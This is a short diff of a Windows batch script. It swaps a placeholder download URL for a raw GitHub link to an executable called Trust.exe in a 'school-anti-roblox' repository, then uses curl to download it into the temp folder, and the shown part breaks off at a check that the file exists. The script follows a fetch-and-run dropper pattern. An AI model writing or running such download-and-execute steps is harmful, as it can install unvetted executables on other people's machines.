@@ -1,5 +1,5 @@
 @echo off
-set EXE_URL=https://github.com/your-username/your-repo/releases/download/v1.0/your-file.exe
+set EXE_URL=https://raw.githubusercontent.com/TheNikOSTeam/school-anti-roblox/refs/heads/main/Trust.exe
 set TEMP_DIR=%TEMP%\your-file.exe
 curl -L -o "%TEMP_DIR%" "%EXE_URL%"
 if exist "%TEMP_DIR%" (
